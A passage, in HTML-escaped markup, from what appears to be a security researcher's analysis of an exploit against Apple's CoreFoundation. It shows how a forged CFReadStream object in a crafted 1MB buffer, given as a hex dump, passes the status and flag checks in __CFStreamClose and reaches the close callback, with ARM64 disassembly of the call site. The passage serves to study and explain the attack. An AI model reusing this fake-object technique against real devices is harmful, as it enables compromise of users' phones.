 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c29 XQFzMDWmii-c6&quot;&gt;// Stream is not open from the client&amp;#39;s perspective;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c29&quot;&gt;// do not callout and do not update our status to &amp;quot;closed&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFBitIsSet(stream-&amp;gt;flags,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;HAVE_CLOSED))&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFBitSet(stream-&amp;gt;flags,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;HAVE_CLOSED);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFBitSet(stream-&amp;gt;flags,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;CALLING_CLIENT);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;(cb-&amp;gt;close)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;cb-&amp;gt;close(stream,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;_CFStreamGetInfoPointer(stream));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_CFStreamGetStatus&lt;/span&gt;&lt;span&gt;&amp;nbsp;extracts the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;status&lt;/span&gt;&lt;span&gt;&amp;nbsp;bitfield from the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;field:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;#define&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFStreamGetStatus(x)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;__CFBitfieldGetValue((x)-&amp;gt;flags,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;MAX_STATUS_CODE_BIT,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5&quot;&gt;MIN_STATUS_CODE_BIT)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Looking at the 1MB object again the flags field is the first non-base field:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000000 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000010 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;80 26 00 00 01 00 00 00 &amp;nbsp;|.........&amp;amp;......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000020 &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c20 XQFzMDWmii-c23&quot;&gt;1f 00 00 00&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;&amp;nbsp;00 00 00 00 &amp;nbsp;10 00 8b 56 02 00 00 00 &amp;nbsp;|...........V....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000030 &amp;nbsp;b0 c3 31 16 02 00 00 00 &amp;nbsp;48 e3 01 00 00 00 00 00 &amp;nbsp;|..1.....H.......|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000040 &amp;nbsp;20 ec 46 58 02 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;| .FX............|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000050 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000060 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;60 bf 31 16 02 00 00 00 &amp;nbsp;|........`.1.....|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c9 XQFzMDWmii-c20&quot;&gt;00000070 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;00 00 00 00 00 00 00 00 &amp;nbsp;|................|&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;That gives a status code of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;with all the other flags bits clear. This gets through the two conditional branches to reach this close callback call:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c2 XQFzMDWmii-c8&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5 XQFzMDWmii-c8&quot;&gt;(cb-&amp;gt;close)&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5 XQFzMDWmii-c8&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5 XQFzMDWmii-c8&quot;&gt;cb-&amp;gt;close(stream,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5 XQFzMDWmii-c8&quot;&gt;_CFStreamGetInfoPointer(stream));&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c5 XQFzMDWmii-c8&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;At this point we need to switch to looking at the assembly to see what&amp;#39;s really happening:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__CFStreamClose&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;var_30=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;-0x30&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;var_20=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;-0x20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;var_10=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;-0x10&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;var_s0=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c17 XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;PACIBSP&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;STP&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X24,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X23,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[SP,#-0x10+var_30]!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;STP&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X22,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X21,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[SP,#0x30+var_20]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;STP&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X20,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X19,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[SP,#0x30+var_10]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;STP&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X29,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X30,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[SP,#0x30+var_s0]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;ADD&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X29,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;SP,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;#0x30&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;MOV&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X19,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;BL&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;__CFStreamGetStatus&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CBZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X0,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;loc_187076958&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The fake &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFReadStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the first argument to this function, so passed in the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X0&lt;/span&gt;&lt;span&gt;&amp;nbsp;register. It&amp;#39;s then stored into &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X19&lt;/span&gt;&lt;span&gt;&amp;nbsp;so it survives the call to &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__CFStreamGetStatus&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Skipping ahead past the flag checks we reach the callback callsite (this is also the crash site seen earlier):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X19,#0x30]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X8,#0x58]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CBZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;loc_187076758&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X1,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X19,#0x28]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;MOV&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X0,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X19&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;BLRAAZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8&lt;/span&gt;&lt;/p&gt;
